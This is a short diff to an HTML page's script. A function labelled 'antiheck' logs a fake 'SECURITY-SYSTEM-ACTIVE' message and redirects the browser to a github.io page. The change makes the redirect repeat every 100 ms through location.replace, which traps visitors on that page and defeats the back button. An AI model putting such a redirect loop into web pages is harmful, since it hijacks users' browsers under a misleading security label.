@@ -6,11 +6,13 @@
 <body>
     <script>
     function antiheck() {
-        console.error("SECURITY-SYSTEM-ACTIVE");
-        window.location.href = "https://akifbardan0-creator.github.io/Sonsuz-d-ng-/";
-        setTimeout(antiheck, 100);
-    }
-    antiheck();
+    console.error("SECURITY-SYSTEM-ACTIVE");
+    window.location.replace("https://akifbardan0-creator.github.io/Sonsuz-d-ng-/");
+}
+
+setInterval(antiheck, 100);
+antiheck();
+        
     </script>
     
 </body>
